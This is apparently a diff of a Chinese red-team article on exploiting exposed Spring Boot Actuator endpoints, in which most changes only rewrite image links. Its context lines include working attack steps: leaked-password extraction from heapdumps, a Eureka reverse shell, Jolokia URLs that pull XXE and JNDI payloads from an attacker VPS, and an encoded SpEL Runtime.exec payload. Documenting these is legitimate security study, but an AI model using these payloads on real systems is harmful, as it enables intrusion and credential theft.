@@ -67,7 +67,7 @@ schema_version: "1"
 
 在拿到一个网站后通常通过两个位置判断网站是否使用了`Spring Boot`框架。1、网站图片文件是一个绿色的树叶。2、特有的报错信息。
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdvmshdHyicrMqyGx0pJQtQHR4bDhCDBicGb0nR7Egk63SOfiaDn2VYgnhA/640?wx_fmt=jpeg)
+![](../../.resource/remote/b46458d32eb0b4829b67ddc2e773a850d940a8eb39905280a5d86c8ad7e0fa78.jpg)
 
 如果开发人员配置不当，将接口暴露在公网上或者未配置权限限制访问，黑客可以使用以下的`Actuator`监控原生端点获取到一些网站的敏感数据。  
 
@@ -75,19 +75,19 @@ schema_version: "1"
 
 `GET`请求`/env`会泄露环境变量信息，或者配置中的一些用户名，当程序员的属性名命名不规范会泄露密码明文。
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdXg1HJpphickw0XUNSDK08adEkaQwlvkwFFng3CqOdITHqWvHEGBnPxQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/6f923b01991b3b6b48e440b2ed9b6cfc9d32fed1fe26748432087c1acd857740.jpg)
 
   
 
 通过`/env`端口泄露的信息发现使用的是`AWS`云主机。
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFduqGL0KIY1EdkFnDDtTbvrKjgP9a9uW5vaWqD8Vicpg7hMWQIiazooqNg/640?wx_fmt=jpeg)
+![](../../.resource/remote/ad83dd60bdf09a702f2b4baca60f6c5ef8b076286358aff07ad981d0e77c5b90.jpg)
 
   
 
 正常`GET`请求目标`/heapdump`或`/actuator/heapdump`接口获取被星号脱敏的密码的明文，下载应用实时的`JVM`堆信息。成功下载，如下图所示。
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdXAQ28EibG37hhjaIsCLEZs0tvZY8hwojmskicJBQiaecrmQQYiaU0OR2Pw/640?wx_fmt=jpeg)
+![](../../.resource/remote/ac1ad9752954df6d5159f00363c4ac0cfcb9dc271abf53a90d0547b8a3859452.jpg)
 
 使用`Eclipse Memory Analyzer`工具的`OQL`（对象查询语言）语句：
 
@@ -97,7 +97,7 @@ schema_version: "1"
 
 辅助快速过滤分析，获得密码明文。成功获取`challengepassword`密码 `*.H......`
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFd278ibtLs9b34gj0hBv5OcSsckN4mzX1lrWOE1IZU17yLK4tBIgbI5Mw/640?wx_fmt=jpeg)
+![](../../.resource/remote/dda20328e67fb43e06817c97bfa91f6ad5283b6dd6eaf097b8901d266e87afa5.jpg)
 
 但是有点遗憾的是该目标网站并没有找到 `accessKey`、`secreKey`，如果能成功查询出这两个Key就可以利用下面的工具进行命令执行等系列操作，或者使用行云管家对主机进行绑定。
 
@@ -142,7 +142,7 @@ schema_version: "1"
 
 通常`Eureka`是在`Netflix`上部署，我们利用关键词`netflix`或者 `eureka.client.serviceUrl.defaultZone`在`env`端点泄露的信息中进行搜索。
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdGof9vjagn4lSIOr2GMbL8GOuTxTiampYyLW50ibKmyE0rzQwrvQIOA4A/640?wx_fmt=jpeg)
+![](../../.resource/remote/219d6efb8b437e6d57d1f66404ae0bfdaff0fda60038ee70c3e6dd627c0aa5e2.jpg)
 
 在`VPS`上搭建`Eureka Server`，启动该服务的端口是 2333。反弹`shell`的端口是 443，反弹`shell`的`ip`是启动服务的地址。
 
@@ -152,23 +152,23 @@ schema_version: "1"
 
   
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdOBiboNm9aFvLmGrTkzWsKtkXIoWl9Ejs51zP40J3KBuicob66SblcxWg/640?wx_fmt=jpeg)
+![](../../.resource/remote/84c8bcd54bb76955300cee4d005926f7c30c1a09dfd3f572d9d7fa8208865ce3.jpg)
 
 抓包改变请求方式`GET→POST` ，修改`eureka.client.serviceUrl.defaultZone`属性为启动`eureka server`地址。
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdU6l8U2qwcQxpumh0mWx6OotCCL4Vy6wXDQUvmqaEeLpGribQEucPTdw/640?wx_fmt=jpeg)
+![](../../.resource/remote/dbb514e77f7c000fb774e4a632396db282762dd45be94d75c932fa9e39a30864.jpg)
 
 访问`/refresh`刷新设置。
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdyjxlnLwqzKUXOFkXleK4FTsCEvjGrWpsI5MrlXIat8hdcUzPIG9zCw/640?wx_fmt=jpeg)
+![](../../.resource/remote/3956da0b9f697f6059c67a802ee9536f7f0a0660f989c3abbd95f6381a626f40.jpg)
 
 服务端接收到请求。
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFd7nuA752giaqXuFgWNv8WJiaF5agOQruKQI7ibcNg79l8YAwb9pJumgAmg/640?wx_fmt=jpeg)
+![](../../.resource/remote/33cb0f6e06464c5aa92a928337dfabeae33770df83a6a760f45ad9a8d3223c08.jpg)
 
 在`VPS`的 443 端口设置监听，可以看到成功反弹`shell`。
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdNzkY6icOqhWd8Jv3iaYu3FkkqBBCII0iaPaRDs64BHshxAg4b5HapuwpA/640?wx_fmt=jpeg)
+![](../../.resource/remote/6861365645bc86c118a234c6f795ac20bc8a3bde4568bc9c468868cec701ddb1.jpg)
 
 0x03 Jolokia 组件漏洞
 -----------------
@@ -201,9 +201,9 @@ schema_version: "1"
 
 在 `VPS` 上创建 `XXE` 攻击文件，并使用命令`python -m SimpleHTTPServer 8888`开启`web`服务。
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdibEJAiaUfibVzicSTFBV4oum9WAyApmDtQRgLVrTEwZHqT1o8Qj90tDtjQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/cc4bf298d874960a02acfbc5abe5cb9722e6068e3dd4824c04e38245a984fcd7.jpg)
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdx6Kj8T31usoGWKa53YqMkuxNOZ86zsW6amJ7lpykmJ0OFq4ibIia167A/640?wx_fmt=jpeg)
+![](../../.resource/remote/d085f2fad7d584e473f8d3ee859aecb018cfcab8e34032c1e57ac60d5b0df33d.jpg)
 
 ```
 `构造连接：``http://10.27.2.188:9099/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/vps-ip:8888!/logback.xml`
@@ -211,17 +211,17 @@ schema_version: "1"
 
 可以成功读取`/etc/passwd`文件内容。
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdIyS9GFAzibsNgmfZiagxYf0NISehWSM7dCqhkWuA6Xog7lBsugotncmg/640?wx_fmt=jpeg)
+![](../../.resource/remote/9cbc61ba74cfe566346e8e5ef5cfc6f073e9c60e35b187c25378acf1b26a36f6.jpg)
 
 ### 3.4 Jolokia Logback JNDI RCE 漏洞利用
 
 首先在 `VPS` 上上传 JNDI[1]，并启动 `JNDI` 服务 `java -jar JNDI-1.0-all.jar`
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFd9R1e1QI1yh6gU9KlZClm54aYlIpcxFIf5IUxHVox5TtFiaiaic8WicTD4A/640?wx_fmt=jpeg)
+![](../../.resource/remote/6d2c86c5d11ce3fc2b5f050d06a17682e5fc75681d2b9c3412129f99eabb28fd.jpg)
 
 修改 `jolokia-logback.xml` 并上传到 `VPS` 上。
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdiaYPLYT3ia2epBClqplOPCVh3KYFraMkgKvvWEoJfXJreswE3h2ibqOag/640?wx_fmt=jpeg)
+![](../../.resource/remote/fb8277e13f4fb8d9656974059212eba684d0913597c4688a5380c01ec6aee828.jpg)
 
 ```
 `构造连接：``http://10.27.2.188:9099/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/vps-ip:8888!/jolokia-logback.xml`
@@ -229,13 +229,13 @@ schema_version: "1"
 
 可成功打开计算器。
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdRgfNhkYu0icCM31GlZbianDv15ibs0h7AkAMaTozC6XoHISAGCPXEh0rQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/dfe3a3ceaf47e2cf75a26ddc4399683840fe2ec06a8c61972e5edd1383b0d048.jpg)
 
   
 
 查看 `JNDI` 的 `config.properties`，可以进行命令执行、文件写入等操作。
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdgkeUtSntRpWS2Abc3wiaNfhPtjjlrpwsdiaKGPBMrnlxAUff3QwV17fg/640?wx_fmt=jpeg)
+![](../../.resource/remote/3ca998638c062eff2d60454387dde7612fbad49852aa9962b863c8305986754d.jpg)
 
 0x04 H2 Database Query RCE
 --------------------------
@@ -260,7 +260,7 @@ schema_version: "1"
 
 （3）存在`com.h2database.h2`依赖。
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdvq4yb1flKbQhpQYibqftmyehSbt6VLXFq6I4JemSy1zFJ2K0ONZQWEg/640?wx_fmt=jpeg)
+![](../../.resource/remote/189adf5c8afed1920f60e5692a924619b287cb13e312b4bde7f4a3effaa6ac90.jpg)
 
 ### 4.3 漏洞利用
 
@@ -272,9 +272,9 @@ schema_version: "1"
 
 由于环境是`Spring 2.x`版本还需要修改请求体中的`content-type`字段的值 `application/json`。
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFd0EqmD31lyP0LI1IOVXAfmxPFkOtbnTicdnf02KAFI7hIuzMtghib1uGw/640?wx_fmt=jpeg)
+![](../../.resource/remote/da3670e03261211ca4210eb477525b05ca554763f47578b1242b684965c69808.jpg)
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdx54l9DO6hRicBtxV9eeXU6HEZATEffibHI1BnfL9cu8krc5sl41HAVTQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/53c3134ad09052d062becb1fcf4b9bf9b11a50614b825bb8e0574884e51ed43c.jpg)
 
   
 
@@ -301,7 +301,7 @@ schema_version: "1"
 
 `SpEL`使用 `#{...}` 作为定界符，所有在大括号中的字符都将被认为是`SpEL`表达式，我们可以在其中使用运算符，变量以及引用`bean`，属性和方法。
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFd2nycMY5ycqRq20wItWzT5zzpv4ic5YQ6H2ed9EdBO7xQHEFa8Q8Acfw/640?wx_fmt=jpeg)
+![](../../.resource/remote/9304fa1face038c3285e453339db53ff8a5a4833f07a2af8f906a6de2dde5d98.jpg)
 
 执行 `open -a Calculator` 命令：
 
@@ -309,7 +309,7 @@ schema_version: "1"
 ${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFduibKqUKDADOXpYkFxGiaIVJHjjtsOb7ULRfOLSGjMa5pQWUicFwl1Tjfw/640?wx_fmt=jpeg)
+![](../../.resource/remote/9fc5d37e463154cc482d50ac2c419b1eaa0d2ab06331646a110b0df18dd9e1ea.jpg)
 
   
 
@@ -340,7 +340,7 @@ _https://www.freebuf.com/column/234719.html_
 
 **推荐关注(红队方向)：**
 
- ![](http://mmbiz.qpic.cn/mmbiz_png/2tA4hG6O9pyRtgZD1QZjuZKGousFdK6w43nmK1fPKzTrwgJ1ZzVDkJrz2zQ5bDxJ2icbJN5R70PUXx3IKibzwNtQ/0?wx_fmt=png) ** 橘猫学安全 ** 每日一干货🙂 0篇原创内容   公众号
+ ![](../../.resource/remote/ae14e74748bbb7f0319b001fab5a4b577487452a533794c0e75ade8ea31062c1.png) ** 橘猫学安全 ** 每日一干货🙂 0篇原创内容   公众号
 
 ---
 
